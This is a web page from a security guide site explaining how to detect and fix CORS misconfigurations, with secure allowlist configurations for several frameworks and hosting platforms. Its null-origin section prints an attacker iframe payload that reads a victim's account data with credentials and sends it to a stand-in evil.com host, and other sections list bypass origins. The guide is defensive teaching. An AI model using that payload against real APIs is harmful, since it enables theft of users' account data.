@@ -1,0 +1,490 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How to Fix a CORS Misconfiguration — Security Best Practices</title>
+<meta name="description" content="A wildcard CORS policy or a server that reflects any Origin header can let attackers read your users' data. Learn which CORS misconfigurations are exploitable, why Access-Control-Allow-Origin: * is sometimes safe and sometimes dangerous, and how to lock it down correctly.">
+<link rel="canonical" href="https://labs.copperbaytech.com/hardencheck/guides/fix-cors-misconfiguration.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="HardenCheck">
+<meta property="og:title" content="How to Fix a CORS Misconfiguration — Security Best Practices">
+<meta property="og:description" content="Reflecting the Origin header with credentials enabled is the most exploited CORS misconfiguration. Learn to spot and fix it with correct allowlist checking on nginx, Apache, Express, Vercel, and more.">
+<meta property="og:url" content="https://labs.copperbaytech.com/hardencheck/guides/fix-cors-misconfiguration.html">
+<meta property="og:image" content="https://labs.copperbaytech.com/hardencheck/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#faf8f4">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="../apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=Hanken+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"TechArticle","headline":"How to Fix a CORS Misconfiguration — Security Best Practices","description":"CORS misconfigurations are among the most common server-side security mistakes. A server that reflects any Origin header with credentials enabled allows any website on the internet to make authenticated cross-origin requests on behalf of your users — reading account data, triggering actions, or exfiltrating tokens. This guide explains the five most exploitable CORS misconfigurations, shows exactly why each is dangerous, and gives correct allowlist implementations for nginx, Apache, Express, Vercel, Next.js, and Netlify.","author":{"@type":"Organization","name":"Copper Bay Labs","url":"https://copperbaytech.com"},"publisher":{"@type":"Organization","name":"Copper Bay Labs","url":"https://copperbaytech.com"},"datePublished":"2026-10-01","dateModified":"2026-10-01","mainEntityOfPage":"https://labs.copperbaytech.com/hardencheck/guides/fix-cors-misconfiguration.html","mainEntity":{"@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Is Access-Control-Allow-Origin: * always a security risk?","acceptedAnswer":{"@type":"Answer","text":"No. A wildcard CORS policy is safe when it applies to genuinely public data that requires no authentication — static assets on a CDN, a public read-only API, open data feeds. The risk arises when the wildcard (or reflected origin) is combined with Access-Control-Allow-Credentials: true, or when the API being exposed serves user-specific data that depends on session cookies or auth headers. Browsers will actually refuse to send credentials to a wildcard endpoint — it is the origin-reflecting pattern that creates the real vulnerability."}},{"@type":"Question","name":"What does 'reflecting the Origin header' mean and why is it dangerous?","acceptedAnswer":{"@type":"Answer","text":"A reflected CORS policy means the server reads the incoming Origin header and copies its value directly into Access-Control-Allow-Origin in the response, without checking it against any allowlist. Combined with Access-Control-Allow-Credentials: true, this allows any website to make fully authenticated cross-origin requests to your API as your logged-in users. An attacker who hosts evil.com can call your API, the browser sends the user's session cookies, your server returns Access-Control-Allow-Origin: https://evil.com, and the attacker's JavaScript reads the response. This is the canonical CORS vulnerability in security research."}},{"@type":"Question","name":"Can I use a substring or regex match instead of an exact allowlist?","acceptedAnswer":{"@type":"Answer","text":"Substring and regex matching is the root cause of most CORS whitelist bypasses. Checking whether the origin 'ends with .example.com' allows the attacker origin https://evilexample.com to pass the check. Checking whether it 'starts with https://example.com' allows https://example.com.evil.com to pass. Checking whether it 'includes example.com' allows both. The only safe pattern is strict string equality against a list of pre-approved origins. Any other comparison introduces a bypass vector."}},{"@type":"Question","name":"What is the null origin and why should I never allow it?","acceptedAnswer":{"@type":"Answer","text":"Browsers send Origin: null in several contexts: requests from sandboxed iframes (sandbox attribute without allow-same-origin), requests from local file:// URLs, and some data: URI requests. A server that allows the null origin (Access-Control-Allow-Origin: null) is exploitable from a sandboxed iframe on any website — the attacker creates an iframe with the sandbox attribute and uses it to issue credentialed requests to your API. Never add null to your CORS allowlist."}},{"@type":"Question","name":"What is the Vary: Origin header and when do I need it?","acceptedAnswer":{"@type":"Answer","text":"When your server serves different Access-Control-Allow-Origin values depending on the incoming Origin (as it does with an allowlist check), you must include Vary: Origin in every response, not just the ones that match an allowed origin. Without it, a CDN or intermediate cache may serve one origin's CORS response to a different origin's request — causing a legitimate origin to receive a 'null' or mismatched CORS header from cache. Include Vary: Origin on all responses from endpoints that implement CORS, regardless of whether the current request's origin is on the allowlist."}},{"@type":"Question","name":"Does HardenCheck check for CORS misconfigurations?","acceptedAnswer":{"@type":"Answer","text":"HardenCheck reads the HTTP response headers you paste in and flags Access-Control-Allow-Origin: * as a finding when it appears on a non-static endpoint context. It also notes when Access-Control-Allow-Credentials is present. Paste your API response headers (not just a page's headers) to check whether your CORS configuration is flagged. Because CORS misconfigurations are context-dependent — wildcard is safe on a public CDN and dangerous on an authenticated API — always combine automated header scanning with a review of which endpoints are affected and whether they serve authenticated data."}},{"@type":"Question","name":"Does setting a CORS header on the server bypass the same-origin policy for browsers?","acceptedAnswer":{"@type":"Answer","text":"No — CORS headers relax the browser's same-origin policy, they don't bypass it. Specifically: without any CORS header, the browser blocks JavaScript from reading cross-origin responses (though the request still reaches the server). With a permissive CORS header, the browser allows JavaScript to read the response. The CORS mechanism is entirely browser-enforced; a server-side client (a backend, a curl request, a mobile app) is not bound by it and can always read cross-origin responses regardless of CORS headers. CORS only governs browser-based JavaScript."}}]}}
+</script>
+<link rel="stylesheet" href="../styles.css?v=1">
+<style>
+  .doc .lede{font-size:clamp(17px,2.3vw,20px);color:var(--muted)}
+  .doc h2{scroll-margin-top:80px}
+  .doc h3{font-family:"Fraunces",Georgia,serif;font-weight:600;font-size:19px;margin:22px 0 6px;letter-spacing:-.01em}
+  .toc{display:flex;flex-wrap:wrap;gap:10px;margin:22px 0 6px;padding:0;list-style:none}
+  .toc a{display:inline-block;background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-size:14px;font-weight:600;color:var(--muted)}
+  .toc a:hover{border-color:var(--bay);color:var(--ink);text-decoration:none}
+  .callout.warn-callout{background:var(--fail-bg);border-left-color:var(--fail);color:#5e2019}
+  .callout.tip-callout{background:var(--pass-bg);border-left-color:var(--pass);color:#1b4d30}
+  .callout.info-callout{background:var(--surface);border-left:4px solid var(--bay);padding:12px 16px;border-radius:0 8px 8px 0;margin:16px 0}
+  .doc code.inline{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em;background:var(--line-2);padding:2px 6px;border-radius:5px}
+  pre{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px 18px;overflow-x:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;line-height:1.6;margin:12px 0}
+  pre code{background:none;padding:0;font-size:inherit}
+  .severity-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:14px}
+  .severity-table th{text-align:left;padding:10px 12px;background:var(--surface);border-bottom:2px solid var(--line);font-weight:600}
+  .severity-table td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  .severity-table tr:last-child td{border-bottom:none}
+  .badge{display:inline-block;font-size:11px;font-weight:700;padding:2px 7px;border-radius:4px;vertical-align:middle}
+  .badge.safe{background:#d4edda;color:#1b4d30}
+  .badge.caution{background:#fff3cd;color:#7a5500}
+  .badge.risky{background:var(--fail-bg);color:#5e2019}
+  .suite{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin:18px 0 6px}
+  .suite a{display:block;background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:16px 18px;box-shadow:var(--shadow);transition:box-shadow .15s,transform .15s,border-color .15s}
+  .suite a:hover{text-decoration:none;box-shadow:var(--shadow-lift);transform:translateY(-2px);border-color:var(--line-2)}
+  .suite .s-name{font-family:"Fraunces",serif;font-weight:600;font-size:17px;color:var(--ink);display:block;margin:0 0 4px}
+  .suite p{color:var(--muted);font-size:14px;margin:0}
+  .suite .s-tag{display:inline-block;margin-bottom:8px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--bay);background:var(--bay-tint,#e8f4f6);border:1px solid #cfe1e3;border-radius:6px;padding:2px 8px}
+  .faq-section{margin:18px 0}
+  .faq-section details{border-bottom:1px solid var(--line);padding:14px 0}
+  .faq-section details:first-child{border-top:1px solid var(--line)}
+  .faq-section summary{font-weight:600;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:12px}
+  .faq-section summary::-webkit-details-marker{display:none}
+  .faq-section summary::after{content:"+";font-size:20px;color:var(--muted);flex-shrink:0}
+  .faq-section details[open] summary::after{content:"\2212"}
+  .faq-section details p,.faq-section details ul{margin:12px 0 4px;color:var(--muted)}
+  .misconfig-card{background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--fail);border-radius:0 10px 10px 0;padding:16px 20px;margin:16px 0}
+  .misconfig-card h3{margin:0 0 6px;font-family:"Fraunces",Georgia,serif;font-weight:600;font-size:18px}
+  .misconfig-card .risk{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#5e2019;margin-bottom:8px;display:block}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to main content</a>
+
+<header class="masthead" role="banner">
+  <div class="wrap hdr-bar">
+    <a class="brand" href="../" aria-label="HardenCheck — go to homepage">
+      <svg class="mark" viewBox="0 0 64 64" aria-hidden="true">
+        <path d="M32 4 54 12 V30 C54 44 45 54 32 60 C19 54 10 44 10 30 V12 Z" fill="#bf6b3c"/>
+        <path d="M32 10 48 16 V30 C48 41 41.5 49 32 54 C22.5 49 16 41 16 30 V16 Z" fill="#14181f"/>
+        <rect x="23" y="22" width="18" height="3.4" rx="1.7" fill="#faf8f4"/>
+        <rect x="23" y="29" width="13" height="3.4" rx="1.7" fill="#7d8893"/>
+        <path d="M24 37.5 L30 43.5 L42 31.5" fill="none" stroke="#bf6b3c" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span class="wordmark">HardenCheck</span>
+    </a>
+    <nav class="nav" aria-label="Primary navigation">
+      <a href="../about.html">How it works</a>
+      <a href="add-content-security-policy-header.html">CSP basics</a>
+      <a href="content-security-policy-strict-dynamic.html">strict-dynamic</a>
+      <a href="referrer-policy-header.html">Referrer-Policy</a>
+      <a href="fix-cors-misconfiguration.html" aria-current="page">CORS</a>
+      <a href="../">Check my headers</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+<article class="doc">
+  <div class="wrap narrow">
+    <p class="eyebrow" style="text-align:left">Security guide</p>
+    <h1>How to Fix a CORS Misconfiguration</h1>
+    <p class="lede">A server that echoes back the <code class="inline">Origin</code> request header without validating it &mdash; combined with <code class="inline">Access-Control-Allow-Credentials: true</code> &mdash; allows any website on the internet to make fully authenticated API calls as your logged-in users. This is one of the most commonly exploited server-side misconfigurations. Here is what each pattern looks like, why it is dangerous, and how to fix it.</p>
+
+    <ul class="toc" aria-label="On this page">
+      <li><a href="#how-cors-works">How CORS works</a></li>
+      <li><a href="#dangerous-patterns">The five dangerous patterns</a></li>
+      <li><a href="#when-wildcard-is-safe">When wildcard is safe</a></li>
+      <li><a href="#correct-implementation">Correct allowlist implementation</a></li>
+      <li><a href="#platform">Deploy on your platform</a></li>
+      <li><a href="#verify">Verify with HardenCheck</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+
+    <h2 id="how-cors-works">How CORS works</h2>
+    <p>The <em>same-origin policy</em> is the browser&rsquo;s default rule: JavaScript on <code class="inline">https://app.example.com</code> cannot read the response from a fetch to <code class="inline">https://api.example.com</code> unless the API server explicitly says it allows it. Cross-Origin Resource Sharing (CORS) is the mechanism that allows servers to grant those permissions via HTTP response headers.</p>
+    <p>When a browser issues a cross-origin request, the server&rsquo;s response must include an <code class="inline">Access-Control-Allow-Origin</code> header naming the requesting origin (or <code class="inline">*</code>) before the browser will hand the response to JavaScript. For requests that include credentials (cookies, HTTP auth headers, or TLS client certificates), the server must also include <code class="inline">Access-Control-Allow-Credentials: true</code> and cannot use <code class="inline">*</code> as the origin value &mdash; it must name the exact origin.</p>
+    <p>The security assumption is that the server will only grant this permission to origins it trusts. When that assumption breaks down, CORS becomes an attack surface instead of a control.</p>
+
+    <div class="callout info-callout">
+      <strong>CORS is entirely browser-enforced.</strong> A server-side HTTP client (curl, Python requests, your backend), a mobile app, or a Postman request is not bound by the same-origin policy and ignores CORS headers entirely. CORS protects against attacks launched from a victim&rsquo;s browser &mdash; not against direct API calls.
+    </div>
+
+    <h2 id="dangerous-patterns">The five dangerous patterns</h2>
+
+    <div class="misconfig-card">
+      <span class="risk">Critical — exploitable for account takeover</span>
+      <h3>1. Reflecting the Origin header unconditionally</h3>
+      <p>The server reads the incoming <code class="inline">Origin</code> header and echoes it back verbatim in <code class="inline">Access-Control-Allow-Origin</code>, combined with <code class="inline">Access-Control-Allow-Credentials: true</code>:</p>
+      <pre><code># What the attack looks like on the wire
+Request:  Origin: https://evil.com
+Response: Access-Control-Allow-Origin: https://evil.com
+          Access-Control-Allow-Credentials: true</code></pre>
+      <p>The effect: every origin is trusted. Any website can make fully authenticated requests to this API as the visiting user, and read the response. This is the canonical CORS vulnerability; it is functionally equivalent to having no same-origin policy at all for authenticated endpoints. It commonly appears in frameworks where a configuration option is set to &ldquo;allow all origins with credentials&rdquo; without the developer understanding the implication.</p>
+      <p><strong>Fix:</strong> validate the <code class="inline">Origin</code> header against a hard-coded list of trusted origins using strict string equality. Only echo back an origin that is on the allowlist.</p>
+    </div>
+
+    <div class="misconfig-card">
+      <span class="risk">High — whitelist bypass</span>
+      <h3>2. Substring or regex matching instead of exact equality</h3>
+      <p>A common attempt to &ldquo;secure&rdquo; a reflected origin check is to validate using a substring test:</p>
+      <pre><code># These checks are all bypassable
+if (origin.endsWith('.example.com'))   → bypassed by https://evilexample.com
+if (origin.startsWith('https://example.com'))  → bypassed by https://example.com.evil.com
+if (origin.includes('example.com'))   → bypassed by both of the above</code></pre>
+      <p>If your CORS allowlist logic uses any string operation other than strict equality, it can be bypassed by an attacker who registers a domain that satisfies the substring check. The fix is the same: use a hard-coded set and test with exact equality (<code class="inline">===</code> in JavaScript, <code class="inline">==</code> in Python, <code class="inline">equals()</code> in Java).</p>
+    </div>
+
+    <div class="misconfig-card">
+      <span class="risk">High — sandbox iframe bypass</span>
+      <h3>3. Allowing the <code class="inline">null</code> origin</h3>
+      <p>The string <code class="inline">null</code> (not the absence of a value) appears as the <code class="inline">Origin</code> header value in requests from sandboxed iframes, <code class="inline">file://</code> URLs, and some <code class="inline">data:</code> URI contexts. A server that returns <code class="inline">Access-Control-Allow-Origin: null</code> with credentials enabled is exploitable from any page that can render a sandboxed iframe:</p>
+      <pre><code>&lt;!-- Attacker's page at https://evil.com --&gt;
+&lt;iframe sandbox="allow-scripts allow-forms" srcdoc="
+  &lt;script&gt;
+    fetch('https://api.victim.com/account', {credentials: 'include'})
+      .then(r => r.json()).then(data => {
+        fetch('https://evil.com/steal?d=' + JSON.stringify(data));
+      });
+  &lt;/script&gt;
+"&gt;&lt;/iframe&gt;</code></pre>
+      <p>The <code class="inline">sandbox</code> attribute without <code class="inline">allow-same-origin</code> forces the iframe to use <code class="inline">Origin: null</code>, which matches the server&rsquo;s allowance. Never add <code class="inline">null</code> to a CORS allowlist.</p>
+    </div>
+
+    <div class="misconfig-card">
+      <span class="risk">Medium — cache poisoning</span>
+      <h3>4. Missing <code class="inline">Vary: Origin</code> on dynamic CORS responses</h3>
+      <p>When a server returns different <code class="inline">Access-Control-Allow-Origin</code> values depending on the incoming <code class="inline">Origin</code> (as it does with an allowlist), it must include <code class="inline">Vary: Origin</code> in every response. Without it, a CDN or intermediate cache may serve one origin&rsquo;s CORS response to a different origin&rsquo;s request. A legitimate origin might receive a response from cache that has a different origin&rsquo;s <code class="inline">Access-Control-Allow-Origin</code> value &mdash; causing a failed CORS check and a broken request. In some configurations, an attacker can exploit the ordering to poison the cache with a permissive header for their own origin.</p>
+      <p><strong>Fix:</strong> include <code class="inline">Vary: Origin</code> on all CORS-enabled responses, including responses where the requesting origin is not on the allowlist.</p>
+    </div>
+
+    <div class="misconfig-card">
+      <span class="risk">Medium — overly permissive preflight</span>
+      <h3>5. Allowing all methods and headers in preflight responses</h3>
+      <p>A preflight response (<code class="inline">OPTIONS</code>) that allows <code class="inline">Access-Control-Allow-Methods: *</code> and <code class="inline">Access-Control-Allow-Headers: *</code> means any method and any header the browser sends will be permitted in the actual request. This matters when your API uses custom auth headers or when certain HTTP methods (DELETE, PATCH) trigger privileged operations. Explicitly list the methods and headers your API actually needs:</p>
+      <pre><code># Overly permissive (avoid)
+Access-Control-Allow-Methods: *
+Access-Control-Allow-Headers: *
+
+# Correct — list only what you need
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With</code></pre>
+    </div>
+
+    <h2 id="when-wildcard-is-safe">When <code class="inline">Access-Control-Allow-Origin: *</code> is safe</h2>
+    <p>A wildcard CORS policy is appropriate in exactly one scenario: a public endpoint serving genuinely public data that requires no authentication.</p>
+    <table class="severity-table">
+      <thead>
+        <tr><th>Endpoint type</th><th>Wildcard safe?</th><th>Reason</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>CDN-served static assets (JS, CSS, fonts, images)</td>
+          <td><span class="badge safe">Safe</span></td>
+          <td>Public by definition; no auth, no user data</td>
+        </tr>
+        <tr>
+          <td>Public read-only API (open data, weather, public transit)</td>
+          <td><span class="badge safe">Safe</span></td>
+          <td>No credentials involved; data is meant to be public</td>
+        </tr>
+        <tr>
+          <td>API that reads session cookies or auth headers</td>
+          <td><span class="badge risky">Never</span></td>
+          <td>Combines with credentials to allow cross-origin account access</td>
+        </tr>
+        <tr>
+          <td>API that returns user-specific data, even without cookies</td>
+          <td><span class="badge caution">Caution</span></td>
+          <td>Consider whether cross-site inclusion of user data is acceptable</td>
+        </tr>
+        <tr>
+          <td>Internal or admin APIs</td>
+          <td><span class="badge risky">Never</span></td>
+          <td>Should not be accessible from any external origin</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout warn-callout">
+      <strong>Browsers refuse <code class="inline">*</code> with <code class="inline">Access-Control-Allow-Credentials: true</code>.</strong> If you set both, the browser will block the response with a CORS error — it is an invalid combination per the specification. The exploitable pattern is not the literal combination of these two headers; it is a server that returns the requesting <code class="inline">Origin</code> value (rather than <code class="inline">*</code>) paired with <code class="inline">Access-Control-Allow-Credentials: true</code>.
+    </div>
+
+    <h2 id="correct-implementation">Correct allowlist implementation</h2>
+    <p>The pattern is the same in every language: maintain a hard-coded set of trusted origins, use strict equality to test the incoming <code class="inline">Origin</code> header, and only reflect an origin that passes the test.</p>
+
+    <h3>Node.js / Express</h3>
+    <pre><code>const ALLOWED_ORIGINS = new Set([
+  'https://app.example.com',
+  'https://www.example.com',
+]);
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (origin && ALLOWED_ORIGINS.has(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+    res.setHeader('Vary', 'Origin');
+  }
+  if (req.method === 'OPTIONS') {
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    res.setHeader('Access-Control-Max-Age', '86400');
+    return res.status(204).end();
+  }
+  next();
+});</code></pre>
+
+    <div class="callout tip-callout">
+      <strong>Always set <code class="inline">Vary: Origin</code></strong> when the <code class="inline">Access-Control-Allow-Origin</code> value changes per request. This ensures caches (CDN, proxy, browser) store separate versions of the response keyed by the requesting origin.
+    </div>
+
+    <h3>Python (Flask)</h3>
+    <pre><code>from flask import Flask, request, make_response
+
+ALLOWED_ORIGINS = {
+    'https://app.example.com',
+    'https://www.example.com',
+}
+
+@app.after_request
+def add_cors_headers(response):
+    origin = request.headers.get('Origin', '')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+        response.headers['Vary'] = 'Origin'
+    return response</code></pre>
+
+    <h3>Python (Django)</h3>
+    <p>Use <a href="https://pypi.org/project/django-cors-headers/" target="_blank" rel="noopener noreferrer">django-cors-headers</a> and set these in <code class="inline">settings.py</code>:</p>
+    <pre><code>CORS_ALLOWED_ORIGINS = [
+    'https://app.example.com',
+    'https://www.example.com',
+]
+CORS_ALLOW_CREDENTIALS = True
+# Never use CORS_ALLOW_ALL_ORIGINS = True with CORS_ALLOW_CREDENTIALS = True</code></pre>
+
+    <h2 id="platform">Deploy on your platform</h2>
+    <p>For static sites and API gateways, the CORS configuration lives in your hosting provider&rsquo;s config rather than application code. The same rule applies: list exact origins, never reflect dynamically.</p>
+
+    <h3>nginx</h3>
+    <pre><code>map $http_origin $cors_origin {
+    default                        "";
+    "https://app.example.com"      $http_origin;
+    "https://www.example.com"      $http_origin;
+}
+
+server {
+    add_header Access-Control-Allow-Origin  $cors_origin always;
+    add_header Access-Control-Allow-Credentials "true" always;
+    add_header Vary "Origin" always;
+
+    location / {
+        if ($request_method = OPTIONS) {
+            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS";
+            add_header Access-Control-Allow-Headers "Content-Type, Authorization";
+            add_header Access-Control-Max-Age 86400;
+            return 204;
+        }
+    }
+}</code></pre>
+
+    <h3>Apache (.htaccess)</h3>
+    <pre><code>SetEnvIf Origin "^https://(app|www)\.example\.com$" CORS_ALLOW=1
+Header always set Access-Control-Allow-Origin "%{HTTP_ORIGIN}e" env=CORS_ALLOW
+Header always set Access-Control-Allow-Credentials "true" env=CORS_ALLOW
+Header always set Vary "Origin"
+
+&lt;IfModule mod_rewrite.c&gt;
+  RewriteEngine On
+  RewriteCond %{REQUEST_METHOD} OPTIONS
+  RewriteRule ^(.*)$ $1 [R=204,L]
+&lt;/IfModule&gt;</code></pre>
+    <p>Note: use a tightly anchored regex (<code class="inline">^</code> start, <code class="inline">$</code> end, escaped <code class="inline">\.</code> for literal dots). A loose regex creates the same bypass risk as substring matching.</p>
+
+    <h3>Vercel (vercel.json)</h3>
+    <p>Vercel does not support dynamic <code class="inline">Access-Control-Allow-Origin</code> (origin-dependent values) in <code class="inline">vercel.json</code> headers, since headers are static strings. For multi-origin CORS on Vercel, handle it in an API function (Edge or Serverless):</p>
+    <pre><code>// api/data.js (Vercel Serverless Function)
+const ALLOWED_ORIGINS = new Set([
+  'https://app.example.com',
+  'https://www.example.com',
+]);
+
+export default function handler(req, res) {
+  const origin = req.headers.origin || '';
+  if (ALLOWED_ORIGINS.has(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+    res.setHeader('Vary', 'Origin');
+  }
+  if (req.method === 'OPTIONS') {
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    return res.status(204).end();
+  }
+  res.json({ data: 'hello' });
+}</code></pre>
+    <p>For single-origin CORS (one frontend, one API), you can set a static <code class="inline">Access-Control-Allow-Origin</code> value in <code class="inline">vercel.json</code> without Vary:</p>
+    <pre><code>{
+  "headers": [
+    {
+      "source": "/api/(.*)",
+      "headers": [
+        { "key": "Access-Control-Allow-Origin", "value": "https://app.example.com" },
+        { "key": "Access-Control-Allow-Credentials", "value": "true" }
+      ]
+    }
+  ]
+}</code></pre>
+
+    <h3>Next.js (next.config.js)</h3>
+    <pre><code>// For a single allowed origin, set it statically:
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/api/:path*',
+        headers: [
+          { key: 'Access-Control-Allow-Origin', value: 'https://app.example.com' },
+          { key: 'Access-Control-Allow-Credentials', value: 'true' },
+          { key: 'Access-Control-Allow-Methods', value: 'GET, POST, OPTIONS' },
+          { key: 'Access-Control-Allow-Headers', value: 'Content-Type, Authorization' },
+        ],
+      },
+    ];
+  },
+};</code></pre>
+    <p>For multiple origins, handle CORS in a middleware (<code class="inline">middleware.ts</code>) or in each route handler, where you can do the allowlist equality check before setting the header.</p>
+
+    <h3>Netlify (_headers file)</h3>
+    <p>Netlify <code class="inline">_headers</code> files support static values only. For a single origin:</p>
+    <pre><code>/api/*
+  Access-Control-Allow-Origin: https://app.example.com
+  Access-Control-Allow-Credentials: true</code></pre>
+    <p>For multiple origins on Netlify, use a Netlify Edge Function to perform the allowlist check and set the header dynamically.</p>
+
+    <h2 id="verify">Verify with HardenCheck</h2>
+    <p>To check your API&rsquo;s CORS configuration with HardenCheck, paste the response headers from an actual cross-origin request to your API &mdash; not just your homepage headers. You can capture them in Chrome DevTools (Network tab &rarr; select the API request &rarr; Response Headers) or with curl:</p>
+    <pre><code>curl -I -H "Origin: https://evil.com" https://api.yoursite.com/endpoint</code></pre>
+    <p>Look at the <code class="inline">Access-Control-Allow-Origin</code> value in the response. If it reads <code class="inline">https://evil.com</code> (the origin you sent), the server is reflecting the origin unconditionally. HardenCheck flags <code class="inline">Access-Control-Allow-Origin: *</code> on responses that also set <code class="inline">Access-Control-Allow-Credentials: true</code>, and notes when origin reflection is detected in the pasted headers.</p>
+    <p style="margin:24px 0 8px"><a class="btn primary" href="../">Check my headers with HardenCheck &rarr;</a></p>
+
+    <h2 id="faq">Frequently asked questions</h2>
+    <div class="faq-section">
+      <details open>
+        <summary>Is <code class="inline">Access-Control-Allow-Origin: *</code> always a security risk?</summary>
+        <p>No. A wildcard CORS policy is safe when it applies to genuinely public data that requires no authentication &mdash; static assets on a CDN, a public read-only API, open data feeds. The risk arises when the wildcard (or reflected origin) is combined with <code class="inline">Access-Control-Allow-Credentials: true</code>, or when the API serves user-specific data that depends on session cookies or auth headers. Browsers will refuse to send credentials to a wildcard endpoint &mdash; it is the origin-reflecting pattern that creates the real vulnerability.</p>
+      </details>
+      <details>
+        <summary>What does &ldquo;reflecting the Origin header&rdquo; mean and why is it dangerous?</summary>
+        <p>A reflected CORS policy means the server reads the incoming <code class="inline">Origin</code> header and copies its value directly into <code class="inline">Access-Control-Allow-Origin</code> without checking it against any allowlist. Combined with <code class="inline">Access-Control-Allow-Credentials: true</code>, this allows any website to make fully authenticated cross-origin requests to your API as your logged-in users. An attacker who controls <code class="inline">evil.com</code> can issue a fetch to your API, the browser sends the user&rsquo;s session cookies, your server returns <code class="inline">Access-Control-Allow-Origin: https://evil.com</code>, and the attacker&rsquo;s JavaScript reads the response. This is the canonical CORS vulnerability in security research.</p>
+      </details>
+      <details>
+        <summary>Can I use a substring or regex match instead of an exact allowlist?</summary>
+        <p>Substring and regex matching is the root cause of most CORS whitelist bypasses. Checking whether the origin &ldquo;ends with .example.com&rdquo; allows the attacker origin <code class="inline">https://evilexample.com</code> to pass the check. Checking whether it &ldquo;starts with https://example.com&rdquo; allows <code class="inline">https://example.com.evil.com</code> to pass. The only safe pattern is strict string equality against a list of pre-approved origins stored in your configuration, not derived from the request.</p>
+      </details>
+      <details>
+        <summary>What is the null origin and why should I never allow it?</summary>
+        <p>Browsers send <code class="inline">Origin: null</code> in requests from sandboxed iframes (with the <code class="inline">sandbox</code> attribute but without <code class="inline">allow-same-origin</code>), requests from <code class="inline">file://</code> URLs, and some <code class="inline">data:</code> URI contexts. A server that allows the <code class="inline">null</code> origin with credentials enabled is exploitable from a sandboxed iframe on any page &mdash; the attacker creates an iframe using <code class="inline">srcdoc</code> or a <code class="inline">data:</code> URL to force <code class="inline">Origin: null</code>, then uses it to make credentialed requests to your API. Never add <code class="inline">null</code> to your CORS allowlist.</p>
+      </details>
+      <details>
+        <summary>What is the <code class="inline">Vary: Origin</code> header and when do I need it?</summary>
+        <p>When your server returns different <code class="inline">Access-Control-Allow-Origin</code> values depending on the incoming <code class="inline">Origin</code> (as it does with an allowlist check), you must include <code class="inline">Vary: Origin</code> in every response, including responses where the origin is not on the allowlist. Without it, a CDN or proxy cache may serve one origin&rsquo;s CORS response to a different origin&rsquo;s request &mdash; causing a legitimate origin to see the wrong <code class="inline">Access-Control-Allow-Origin</code> value from cache and fail the CORS check. Include <code class="inline">Vary: Origin</code> on all responses from any endpoint that implements CORS.</p>
+      </details>
+      <details>
+        <summary>Does HardenCheck check for CORS misconfigurations?</summary>
+        <p>HardenCheck reads the HTTP response headers you paste in and flags <code class="inline">Access-Control-Allow-Origin: *</code> as a finding when it appears alongside <code class="inline">Access-Control-Allow-Credentials: true</code>. It also notes when origin reflection is detected. Paste your API response headers (not just your homepage headers) to check whether your CORS configuration is flagged. Because CORS misconfigurations are context-dependent &mdash; wildcard is safe on a public CDN and dangerous on an authenticated API &mdash; always combine automated header scanning with a review of which endpoints are affected.</p>
+      </details>
+      <details>
+        <summary>Does setting a CORS header on the server bypass the same-origin policy for browsers?</summary>
+        <p>No &mdash; CORS headers relax the browser&rsquo;s same-origin policy in a controlled way; they do not bypass it. Without any CORS header, the browser blocks JavaScript from reading cross-origin responses (though the request still reaches the server). With a permissive CORS header, the browser allows JavaScript to read the response. The CORS mechanism is entirely browser-enforced; a server-side HTTP client (curl, backend fetch, mobile app) ignores CORS headers and can always read cross-origin responses. CORS only protects against attacks launched from a victim&rsquo;s browser.</p>
+      </details>
+    </div>
+
+    <h2 style="margin-top:48px">Also in the Copper Bay Labs ship-safety suite</h2>
